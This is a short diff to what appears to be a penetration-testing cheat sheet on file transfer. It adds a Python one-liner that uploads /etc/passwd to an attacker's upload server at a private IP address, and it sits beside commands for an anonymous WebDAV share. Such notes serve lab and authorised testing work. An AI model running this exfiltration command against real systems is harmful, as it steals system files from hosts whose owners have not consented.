@@ -40,6 +40,12 @@ sudo python3 -m uploadserver
 ```
 ^uploadserver
 
+Upload a file
+```bash
+python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+```
+^upload-file
+
 Create a Webdav share in the /tmp folder on port 80 with anonymous login
 ```bash
 sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
